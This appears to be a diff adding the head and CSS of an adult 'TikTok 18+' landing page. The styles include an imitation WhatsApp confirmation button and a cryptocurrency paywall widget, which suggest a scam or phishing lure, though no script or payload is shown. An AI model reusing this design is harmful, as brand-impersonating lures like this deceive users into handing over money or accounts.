@@ -1,0 +1,3022 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   TikTok 18+ — Hot Videos and Uncensored Live Streams
+  </title>
+  <meta content="Watch TikTok 18+ online — spicy short videos, exclusive live streams, and uncensored private content without restrictions. Adults only (+18)." name="description"/>
+  <link href="https://fonts.googleapis.com" rel="preconnect"/>
+  <link href="css/css2.css" rel="stylesheet"/>
+  <style>
+   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg: #09080a;
+  --bg2: #0f0d10;
+  --surface: rgba(255,255,255,0.028);
+  --surface2: rgba(255,255,255,0.05);
+  --border: rgba(255,255,255,0.06);
+  --border-hi: rgba(240,23,62,0.25);
+  --accent: #f0173e;
+  --accent-glow: rgba(240,23,62,0.18);
+  --text: #f0eaed;
+  --muted: rgba(240,234,237,0.55);
+  --muted2: rgba(240,234,237,0.3);
+  --wa-green: #25D366;
+  --wa-green-dark: #128C7E;
+  --wa-glow: rgba(37, 211, 102, 0.4);
+  --ease: cubic-bezier(0.32,0.72,0,1);
+  --ease-out: cubic-bezier(0.16,1,0.3,1);
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'DM Sans', sans-serif;
+  -webkit-font-smoothing: antialiased;
+  overflow-x: hidden;
+  line-height: 1.6;
+}
+
+/* GRAIN OVERLAY */
+body::after {
+  content: '';
+  position: fixed; inset: 0; z-index: 999;
+  pointer-events: none;
+  opacity: 0.032;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  background-size: 220px;
+}
+
+/* BG AMBIENCE */
+body::before {
+  content: '';
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background:
+    radial-gradient(ellipse 55% 45% at 5% 12%, rgba(240,23,62,0.12), transparent 55%),
+    radial-gradient(ellipse 40% 50% at 95% 85%, rgba(240,23,62,0.06), transparent 55%);
+}
+
+body > * { position: relative; z-index: 1; }
+
+.container { max-width: 1160px; margin: 0 auto; padding: 0 28px; }
+
+h1, h2, h3 { font-family: 'Syne', sans-serif; line-height: 1.05; letter-spacing: -0.03em; }
+
+/* REVEAL ANIMATION */
+.reveal {
+  opacity: 0;
+  transform: translateY(24px);
+  transition: opacity 0.9s var(--ease-out), transform 0.9s var(--ease-out);
+}
+.reveal.visible { opacity: 1; transform: none; }
+.reveal-d1 { transition-delay: 0.1s; }
+.reveal-d2 { transition-delay: 0.2s; }
+.reveal-d3 { transition-delay: 0.3s; }
+.reveal-d4 { transition-delay: 0.4s; }
+
+/* ───── TOP NAVIGATION & LANGUAGE SWITCHER ───── */
+.top-nav {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  z-index: 1000;
+  background: rgba(9, 8, 10, 0.82);
+  -webkit-backdrop-filter: blur(20px);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+  height: 62px;
+  display: flex;
+  align-items: center;
+  transition: all 0.3s var(--ease);
+}
+.nav-container {
+  width: 100%;
+  max-width: 1160px;
+  margin: 0 auto;
+  padding: 0 28px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+}
+.nav-brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  text-decoration: none;
+}
+.nav-logo {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 20px;
+  color: #fff;
+  letter-spacing: -0.02em;
+}
+.nav-logo em {
+  font-style: normal;
+  color: var(--accent);
+}
+.nav-badge {
+  font-family: 'Syne', sans-serif;
+  font-size: 10px;
+  font-weight: 800;
+  letter-spacing: 0.08em;
+  color: #fff;
+  background: var(--accent);
+  padding: 2px 7px;
+  border-radius: 999px;
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+}
+.nav-badge::before {
+  content: '';
+  width: 5px; height: 5px;
+  border-radius: 50%;
+  background: #fff;
+  animation: pulse 1.6s infinite;
+}
+.nav-right {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.lang-selector-wrap {
+  position: relative;
+  display: flex;
+  align-items: center;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  border-radius: 999px;
+  padding: 4px 12px 4px 10px;
+  transition: all 0.25s var(--ease);
+}
+.lang-selector-wrap:hover, .lang-selector-wrap:focus-within {
+  border-color: var(--border-hi);
+  background: rgba(255, 255, 255, 0.08);
+  box-shadow: 0 0 16px rgba(240, 23, 62, 0.15);
+}
+.lang-globe {
+  font-size: 14px;
+  margin-right: 6px;
+  display: inline-flex;
+}
+.lang-dropdown {
+  background: transparent;
+  color: var(--text);
+  border: none;
+  outline: none;
+  font-family: 'DM Sans', sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  -webkit-appearance: none;
+  -moz-appearance: none;
+  appearance: none;
+  padding-right: 14px;
+  background-image: url("data:image/svg+xml,%3Csvg width='10' height='6' viewBox='0 0 10 6' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L5 5L9 1' stroke='%23f0eaed' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right center;
+}
+.lang-dropdown option {
+  background: #141217;
+  color: #fff;
+  padding: 8px 12px;
+}
+.nav-btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: linear-gradient(135deg, #f0173e 0%, #d80e32 100%);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-weight: 700;
+  font-size: 13px;
+  border: none;
+  border-radius: 999px;
+  padding: 8px 16px;
+  cursor: pointer;
+  transition: all 0.25s var(--ease);
+  box-shadow: 0 4px 16px rgba(240, 23, 62, 0.3);
+}
+.nav-btn:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 6px 22px rgba(240, 23, 62, 0.45);
+}
+@media (max-width: 600px) {
+  .top-nav { height: 56px; }
+  .nav-container { padding: 0 16px; }
+  .nav-logo { font-size: 17px; }
+  .nav-btn { display: none; }
+  .lang-selector-wrap { padding: 3px 8px 3px 6px; }
+  .lang-dropdown { font-size: 12px; }
+}
+
+/* ───── HERO ───── */
+.hero {
+  min-height: 100dvh;
+  display: flex; align-items: flex-end;
+  padding-top: 72px;
+  padding-bottom: 80px;
+  position: relative;
+  overflow: hidden;
+}
+.hero-video {
+  position: absolute; inset: 0; z-index: 0;
+  width: 100%; height: 100%;
+  object-fit: cover;
+  opacity: 0.55;
+}
+.hero-overlay {
+  position: absolute; inset: 0; z-index: 1; pointer-events: none;
+  background:
+    linear-gradient(to top, var(--bg) 0%, rgba(9,8,10,0.65) 45%, rgba(9,8,10,0.25) 75%, transparent 100%),
+    linear-gradient(to right, rgba(9,8,10,0.75) 0%, transparent 60%);
+}
+.hero > .container { position: relative; z-index: 2; width: 100%; }
+.hero-content { max-width: 640px; }
+.hero-eyebrow {
+  display: inline-flex; align-items: center; gap: 8px;
+  font-size: 11px; font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase;
+  color: var(--accent); margin-bottom: 24px;
+  padding: 6px 14px; border-radius: 999px;
+  border: 1px solid var(--border-hi);
+  background: rgba(9,8,10,0.6);
+  backdrop-filter: blur(10px);
+}
+.hero-eyebrow .dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--accent);
+  animation: pulse 2s infinite;
+}
+.hero h1 {
+  font-size: clamp(48px, 7.2vw, 92px);
+  font-weight: 800;
+  margin-bottom: 22px;
+  color: var(--text);
+}
+.hero h1 em {
+  font-style: normal;
+  background: linear-gradient(120deg, #f0173e 0%, #ff6a8a 100%);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-desc {
+  font-size: 17px; color: var(--muted);
+  max-width: 500px; line-height: 1.75;
+  margin-bottom: 36px;
+  text-wrap: pretty;
+}
+.hero-desc strong { color: rgba(240,234,237,0.9); font-weight: 600; }
+.hero-actions { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+.hero-caption {
+  margin-top: 22px;
+  font-size: 12px; color: var(--muted2);
+  letter-spacing: 0.04em;
+  display: flex; align-items: center; gap: 16px; flex-wrap: wrap;
+}
+.hero-caption span { display: flex; align-items: center; gap: 6px; }
+
+/* ───── BUTTONS ───── */
+.btn {
+  display: inline-flex; align-items: center; gap: 0;
+  background: linear-gradient(135deg, #f0173e 0%, #d80e32 100%);
+  color: #fff;
+  font-family: 'Syne', sans-serif; font-weight: 700; font-size: 16px;
+  text-decoration: none; border-radius: 999px;
+  padding: 6px 6px 6px 24px;
+  border: none; outline: none; cursor: pointer;
+  transition: transform 0.3s var(--ease), box-shadow 0.3s var(--ease), filter 0.3s var(--ease);
+  box-shadow: 0 8px 30px rgba(240,23,62,0.3);
+  position: relative; overflow: hidden;
+}
+.btn::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(180deg, rgba(255,255,255,0.18) 0%, transparent 50%);
+  pointer-events: none;
+}
+.btn-arrow {
+  width: 34px; height: 34px; border-radius: 999px;
+  background: rgba(0,0,0,0.22); margin-left: 12px;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  transition: transform 0.3s var(--ease);
+}
+.btn:hover { transform: translateY(-2px); box-shadow: 0 14px 45px rgba(240,23,62,0.5); filter: brightness(1.08); }
+.btn:hover .btn-arrow { transform: scale(1.08) translateX(2px); }
+.btn:active { transform: scale(0.97); }
+
+.btn-outline {
+  display: inline-flex; align-items: center; gap: 8px;
+  border: 1px solid var(--border);
+  color: var(--muted); background: transparent;
+  font-family: 'DM Sans', sans-serif; font-weight: 500; font-size: 15px;
+  text-decoration: none; border-radius: 999px;
+  padding: 13px 24px;
+  transition: all 0.3s var(--ease);
+}
+.btn-outline:hover { border-color: var(--border-hi); color: var(--text); background: rgba(240,23,62,0.06); }
+
+/* ───── STATS ───── */
+.stats {
+  padding: 0;
+  border-top: 1px solid var(--border);
+  border-bottom: 1px solid var(--border);
+}
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+}
+.stat {
+  padding: 34px 24px; text-align: center;
+  border-right: 1px solid var(--border);
+  transition: background 0.3s var(--ease);
+}
+.stat:last-child { border-right: none; }
+.stat:hover { background: var(--surface); }
+.stat-n {
+  font-family: 'Syne', sans-serif; font-size: clamp(32px, 4vw, 48px); font-weight: 800;
+  color: var(--accent); line-height: 1;
+  font-variant-numeric: tabular-nums;
+}
+.stat-l { font-size: 13px; color: var(--muted); margin-top: 8px; letter-spacing: 0.02em; }
+
+/* ───── SECTION HEADER ───── */
+.section-tag {
+  display: inline-block; font-size: 11px; font-weight: 700;
+  letter-spacing: 0.18em; text-transform: uppercase; color: var(--accent);
+  margin-bottom: 16px;
+}
+.section-h { font-size: clamp(30px, 4vw, 48px); font-weight: 800; margin-bottom: 14px; }
+.section-sub { font-size: 16px; color: var(--muted); max-width: 520px; line-height: 1.7; text-wrap: pretty; }
+
+/* ───── BANNER ───── */
+.banner {
+  padding: 85px 0;
+  border-bottom: 1px solid var(--border);
+  position: relative; overflow: hidden;
+}
+.banner::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(90deg,
+    transparent 0%,
+    rgba(240,23,62,0.04) 30%,
+    rgba(240,23,62,0.04) 70%,
+    transparent 100%);
+  border-top: 1px solid rgba(240,23,62,0.08);
+  border-bottom: 1px solid rgba(240,23,62,0.08);
+}
+.banner-inner { position: relative; z-index: 1; text-align: center; }
+.banner h2 { font-size: clamp(28px, 3.5vw, 44px); font-weight: 800; margin-bottom: 16px; }
+.banner p { font-size: 16px; color: var(--muted); max-width: 580px; margin: 0 auto 34px; line-height: 1.75; text-wrap: pretty; }
+.tag-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
+.tag-pill {
+  font-size: 13px; color: var(--muted); padding: 8px 18px; border-radius: 999px;
+  border: 1px solid var(--border); background: var(--surface);
+  transition: all 0.25s var(--ease); cursor: default;
+}
+.tag-pill:hover { color: var(--text); border-color: var(--border-hi); background: rgba(240,23,62,0.08); transform: translateY(-1px); }
+
+/* ───── FEATURES ───── */
+.features { padding: 112px 0; }
+.features-layout {
+  display: grid;
+  grid-template-columns: 340px 1fr;
+  gap: 80px;
+  align-items: start;
+}
+.features-sticky { position: sticky; top: 80px; }
+.features-list { display: flex; flex-direction: column; gap: 0; }
+.feature-item {
+  display: grid;
+  grid-template-columns: 38px 1fr;
+  gap: 0 20px;
+  align-items: start;
+  padding: 28px 0;
+  border-bottom: 1px solid var(--border);
+  transition: background 0.25s var(--ease);
+  cursor: default;
+}
+.feature-item:first-child { border-top: 1px solid var(--border); }
+.feature-num {
+  font-family: 'Syne', sans-serif; font-size: 12px; font-weight: 700;
+  color: var(--muted2); letter-spacing: 0.05em; padding-top: 4px;
+  transition: color 0.25s var(--ease);
+}
+.feature-item:hover .feature-num { color: var(--accent); }
+.feature-title {
+  font-family: 'Syne', sans-serif; font-size: 16px; font-weight: 700;
+  margin-bottom: 6px; letter-spacing: -0.01em;
+  transition: color 0.25s var(--ease);
+}
+.feature-item:hover .feature-title { color: var(--text); }
+.feature-desc { font-size: 14px; color: var(--muted); line-height: 1.65; }
+
+/* ───── STEPS ───── */
+.steps { padding: 112px 0; border-top: 1px solid var(--border); }
+.steps-header { text-align: center; margin-bottom: 72px; }
+.steps-row {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 0;
+  position: relative;
+}
+.steps-row::before {
+  content: '';
+  position: absolute;
+  left: 10%; right: 10%; top: 21px; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--border) 20%, var(--border) 80%, transparent);
+}
+.step-col { text-align: center; padding: 0 10px; position: relative; z-index: 1; }
+.step-circle {
+  width: 46px; height: 46px; border-radius: 50%;
+  border: 1px solid var(--border);
+  background: var(--bg);
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 20px;
+  font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 700; color: var(--muted2);
+  transition: all 0.3s var(--ease);
+}
+.step-col:hover .step-circle {
+  border-color: var(--border-hi); color: var(--accent);
+  box-shadow: 0 0 24px rgba(240,23,62,0.25);
+  background: rgba(240,23,62,0.06);
+}
+.step-col h3 { font-size: 14px; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.01em; }
+.step-col p { font-size: 13px; color: var(--muted); line-height: 1.55; }
+
+/* ───── CTA ───── */
+.cta { padding: 140px 0; position: relative; overflow: hidden; text-align: center; }
+.cta::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: radial-gradient(ellipse 65% 65% at 50% 60%, rgba(240,23,62,0.12), transparent 70%);
+}
+.cta::after {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent, rgba(240,23,62,0.25), transparent);
+}
+.cta-inner { position: relative; z-index: 1; }
+.cta h2 {
+  font-size: clamp(40px, 6vw, 72px); font-weight: 800;
+  margin-bottom: 20px;
+}
+.cta p { font-size: 18px; color: var(--muted); max-width: 480px; margin: 0 auto 44px; line-height: 1.7; text-wrap: pretty; }
+.cta-caption { margin-top: 24px; font-size: 13px; color: var(--muted2); letter-spacing: 0.04em; }
+
+/* ───── FOOTER ───── */
+footer {
+  border-top: 1px solid var(--border);
+  padding: 32px 0;
+}
+.footer-row {
+  display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap;
+}
+.footer-left { display: flex; align-items: center; gap: 14px; }
+.badge-18 {
+  font-family: 'Syne', sans-serif; font-weight: 800; font-size: 11px; letter-spacing: 0.06em;
+  color: var(--accent); border: 1px solid var(--border-hi);
+  padding: 3px 9px; border-radius: 4px;
+}
+.footer-copy { font-size: 13px; color: var(--muted2); }
+.footer-links { display: flex; gap: 20px; }
+.footer-links a {
+  font-size: 13px; color: var(--muted2); text-decoration: none;
+  transition: color 0.2s var(--ease);
+}
+.footer-links a:hover { color: var(--text); }
+
+/* ───── BRANDED WHATSAPP CONFIRMATION MODAL ───── */
+.modal-overlay {
+  position: fixed; inset: 0; z-index: 9999;
+  background: rgba(0, 0, 0, 0.85);
+  -webkit-backdrop-filter: blur(14px);
+  backdrop-filter: blur(14px);
+  display: flex; align-items: center; justify-content: center;
+  padding: 20px;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.modal-overlay.active {
+  opacity: 1; pointer-events: auto;
+}
+.branded-modal-card {
+  background: #110e13;
+  background: radial-gradient(circle at 50% -10%, rgba(240, 23, 62, 0.2), transparent 65%), #110e13;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 45px rgba(240, 23, 62, 0.15);
+  border-radius: 24px;
+  width: 100%;
+  max-width: 420px;
+  padding: 38px 28px 28px;
+  text-align: center;
+  position: relative;
+  transform: scale(0.94) translateY(12px);
+  transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.modal-overlay.active .branded-modal-card {
+  transform: scale(1) translateY(0);
+}
+.modal-close-btn {
+  position: absolute;
+  top: 16px;
+  right: 16px;
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  color: var(--muted);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+.modal-close-btn:hover {
+  background: rgba(240, 23, 62, 0.2);
+  color: #fff;
+  transform: rotate(90deg);
+}
+.brand-badge-header {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+.brand-icon-box {
+  position: relative;
+  width: 60px;
+  height: 60px;
+  border-radius: 18px;
+  background: linear-gradient(135deg, rgba(240, 23, 62, 0.25) 0%, rgba(18, 15, 20, 0.9) 100%);
+  border: 1px solid rgba(240, 23, 62, 0.4);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 10px 25px rgba(240, 23, 62, 0.3);
+}
+.brand-age-tag {
+  position: absolute;
+  bottom: -6px;
+  right: -6px;
+  background: var(--accent);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 10px;
+  padding: 2px 6px;
+  border-radius: 999px;
+  border: 2px solid #110e13;
+  letter-spacing: 0.04em;
+}
+.branded-modal-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 23px;
+  font-weight: 800;
+  color: var(--text);
+  margin-bottom: 10px;
+  letter-spacing: -0.02em;
+}
+.branded-modal-desc {
+  font-size: 14px;
+  color: var(--muted);
+  line-height: 1.6;
+  max-width: 340px;
+  margin: 0 auto;
+}
+.original-whatsapp-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  width: 100%;
+  height: 52px;
+  background-color: #25D366;
+  color: #ffffff !important;
+  text-decoration: none;
+  border-radius: 999px;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  letter-spacing: 0.01em;
+  box-shadow: 0 6px 20px rgba(37, 211, 102, 0.35);
+  transition: background-color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
+  margin-top: 24px;
+  margin-bottom: 14px;
+  border: none;
+  cursor: pointer;
+}
+.original-whatsapp-btn:hover {
+  background-color: #20ba5a;
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(37, 211, 102, 0.45);
+}
+.original-whatsapp-btn:active {
+  transform: scale(0.98);
+  background-color: #1da851;
+}
+.original-whatsapp-btn svg {
+  width: 22px;
+  height: 22px;
+  flex-shrink: 0;
+}
+.branded-modal-footer {
+  font-size: 12px;
+  color: var(--muted2);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+
+/* ───── ANIMATIONS ───── */
+@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.8)} }
+
+/* ───── MOBILE ───── */
+@media (max-width: 1024px) {
+  .features-layout { grid-template-columns: 1fr; gap: 48px; }
+  .features-sticky { position: static; }
+}
+@media (max-width: 768px) {
+  .hero { align-items: flex-end; padding-bottom: 56px; }
+  .hero h1 { font-size: clamp(40px, 10vw, 56px); }
+  .hero-desc { font-size: 16px; max-width: 100%; }
+  .hero-actions { flex-direction: column; align-items: stretch; }
+  .hero-actions .btn, .hero-actions .btn-outline { width: 100%; justify-content: center; }
+  .stats-row { grid-template-columns: repeat(2, 1fr); }
+  .stat { border-right: none; border-bottom: 1px solid var(--border); }
+  .stat:nth-child(2n) { border-right: none; }
+  .stat:nth-child(odd) { border-right: 1px solid var(--border); }
+  .stat:nth-last-child(-n+2) { border-bottom: none; }
+  .features { padding: 72px 0; }
+  .steps { padding: 72px 0; }
+  .steps-row { grid-template-columns: 1fr; gap: 0; }
+  .steps-row::before { display: none; }
+  .step-col { display: flex; align-items: flex-start; gap: 20px; text-align: left; padding: 20px 0; border-bottom: 1px solid var(--border); }
+  .step-col:last-child { border-bottom: none; }
+  .step-circle { margin: 0; flex-shrink: 0; }
+  .cta { padding: 88px 0; }
+  .cta p { font-size: 16px; }
+  .footer-row { flex-direction: column; align-items: flex-start; }
+  .banner { padding: 64px 0; }
+  .steps-header { margin-bottom: 40px; }
+  .modal-card { padding: 28px 20px 24px; border-radius: 24px; }
+  .modal-brand-title { font-size: 21px; }
+}
+@media (max-width: 480px) {
+  .hero h1 { font-size: clamp(36px, 11vw, 48px); }
+  .container { padding: 0 20px; }
+}
+
+/* ═══════════════════════════════════════════════════════
+   CRYPTO ACCESS WIDGET & MODAL
+   ═══════════════════════════════════════════════════════ */
+
+/* ── Crypto Modal Overlay ── */
+.crypto-modal-overlay {
+  position: fixed; inset: 0; z-index: 2147483647;
+  background: rgba(0, 0, 0, 0.82);
+  -webkit-backdrop-filter: blur(16px);
+  backdrop-filter: blur(16px);
+  display: flex; align-items: center; justify-content: center;
+  padding: 20px;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+  overflow-y: auto;
+}
+.crypto-modal-overlay.active {
+  opacity: 1; pointer-events: auto;
+}
+.crypto-modal-card {
+  position: relative;
+  width: 100%;
+  max-width: 480px;
+  margin: auto;
+  transform: scale(0.93) translateY(16px);
+  transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.crypto-modal-overlay.active .crypto-modal-card {
+  transform: scale(1) translateY(0);
+}
+.crypto-modal-close {
+  position: absolute;
+  top: 14px; right: 14px;
+  width: 36px; height: 36px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.08);
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  color: var(--muted);
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer;
+  z-index: 10;
+  transition: all 0.25s var(--ease);
+}
+.crypto-modal-close:hover {
+  background: rgba(240, 23, 62, 0.25);
+  border-color: rgba(240, 23, 62, 0.5);
+  color: #fff;
+  transform: rotate(90deg);
+}
+
+.crypto-access {
+  padding: 100px 0;
+  position: relative;
+  overflow: hidden;
+}
+.crypto-access::before {
+  content: '';
+  position: absolute; inset: 0; pointer-events: none;
+  background:
+    radial-gradient(ellipse 50% 50% at 50% 30%, rgba(240,23,62,0.07), transparent 70%),
+    radial-gradient(ellipse 35% 40% at 20% 80%, rgba(100,60,255,0.04), transparent 60%);
+}
+
+/* In-page banner card */
+.crypto-banner-card {
+  max-width: 680px;
+  margin: 0 auto;
+  text-align: center;
+  background: rgba(17, 14, 19, 0.75);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-radius: 24px;
+  padding: 44px 32px;
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 60px rgba(240,23,62,0.06);
+}
+.cw-plan-mini {
+  display: inline-flex; align-items: center; gap: 8px;
+  padding: 8px 18px;
+  background: rgba(255,255,255,0.03);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 999px;
+  font-size: 13px; color: var(--text);
+}
+.cw-plan-mini.active {
+  border-color: rgba(240,23,62,0.4);
+  background: rgba(240,23,62,0.06);
+}
+.cw-badge-inline {
+  background: linear-gradient(135deg, #f0173e, #ff4d6d);
+  color: #fff;
+  font-size: 9px; font-weight: 800;
+  padding: 2px 7px; border-radius: 6px;
+  letter-spacing: 0.06em;
+}
+
+/* ── Widget Container ── */
+.crypto-widget {
+  position: relative; z-index: 1;
+  max-width: 480px;
+  margin: 0 auto;
+  background: rgba(17,14,19,0.92);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 24px;
+  padding: 36px 28px 32px;
+  backdrop-filter: blur(24px);
+  -webkit-backdrop-filter: blur(24px);
+  box-shadow:
+    0 24px 64px rgba(0,0,0,0.6),
+    0 0 0 1px rgba(255,255,255,0.03) inset,
+    0 0 80px rgba(240,23,62,0.08);
+}
+
+/* ── Header ── */
+.cw-header {
+  text-align: center;
+  margin-bottom: 28px;
+}
+.cw-lock-icon {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 44px; height: 44px;
+  border-radius: 14px;
+  background: linear-gradient(135deg, rgba(240,23,62,0.2), rgba(240,23,62,0.05));
+  border: 1px solid rgba(240,23,62,0.3);
+  margin-bottom: 16px;
+  box-shadow: 0 6px 20px rgba(240,23,62,0.2);
+}
+.cw-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 18px;
+  font-weight: 800;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--text);
+  margin-bottom: 6px;
+}
+.cw-subtitle {
+  font-size: 13px;
+  color: var(--muted);
+  letter-spacing: 0.02em;
+}
+
+/* ── Plan Cards ── */
+.cw-plans {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  margin-bottom: 24px;
+}
+.cw-plan {
+  position: relative;
+  background: rgba(255,255,255,0.025);
+  border: 1.5px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 20px 16px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.35s var(--ease);
+  overflow: hidden;
+}
+.cw-plan::before {
+  content: '';
+  position: absolute; inset: 0;
+  border-radius: 16px;
+  background: radial-gradient(ellipse at 50% 0%, rgba(240,23,62,0.12), transparent 70%);
+  opacity: 0;
+  transition: opacity 0.35s var(--ease);
+}
+.cw-plan:hover {
+  border-color: rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.04);
+}
+.cw-plan.active {
+  border-color: rgba(240,23,62,0.5);
+  background: rgba(240,23,62,0.06);
+  box-shadow: 0 0 28px rgba(240,23,62,0.15), 0 0 0 1px rgba(240,23,62,0.1) inset;
+}
+.cw-plan.active::before { opacity: 1; }
+
+.cw-plan-period {
+  font-family: 'Syne', sans-serif;
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 8px;
+  transition: color 0.3s var(--ease);
+  position: relative; z-index: 1;
+}
+.cw-plan.active .cw-plan-period { color: var(--text); }
+
+.cw-plan-price {
+  font-family: 'Syne', sans-serif;
+  font-size: 28px;
+  font-weight: 800;
+  color: var(--text);
+  line-height: 1;
+  margin-bottom: 6px;
+  position: relative; z-index: 1;
+}
+.cw-plan-price .cw-cents { font-size: 18px; }
+.cw-plan-label {
+  font-size: 11px;
+  color: var(--muted2);
+  letter-spacing: 0.04em;
+  position: relative; z-index: 1;
+}
+
+/* Badge */
+.cw-badge {
+  position: absolute;
+  top: -1px; right: -1px;
+  background: linear-gradient(135deg, #f0173e, #ff4d6d);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-size: 9px;
+  font-weight: 800;
+  letter-spacing: 0.1em;
+  padding: 4px 10px;
+  border-radius: 0 16px 0 12px;
+  text-transform: uppercase;
+  z-index: 2;
+}
+
+/* ── Divider ── */
+.cw-divider {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+.cw-divider-line {
+  flex: 1;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent);
+}
+.cw-divider-text {
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--muted2);
+  white-space: nowrap;
+}
+
+/* ── Crypto Selector ── */
+.cw-crypto-options {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+  margin-bottom: 24px;
+}
+.cw-crypto-btn {
+  position: relative;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  background: rgba(255,255,255,0.025);
+  border: 1.5px solid rgba(255,255,255,0.06);
+  border-radius: 14px;
+  padding: 14px 14px;
+  cursor: pointer;
+  transition: all 0.35s var(--ease);
+  color: var(--text);
+  font-family: 'DM Sans', sans-serif;
+}
+.cw-crypto-btn:hover {
+  border-color: rgba(255,255,255,0.12);
+  background: rgba(255,255,255,0.04);
+}
+.cw-crypto-btn.active {
+  box-shadow: 0 0 24px rgba(240,23,62,0.12);
+}
+.cw-crypto-btn[data-crypto="usdt"].active {
+  border-color: rgba(38,161,123,0.5);
+  background: rgba(38,161,123,0.06);
+  box-shadow: 0 0 24px rgba(38,161,123,0.15);
+}
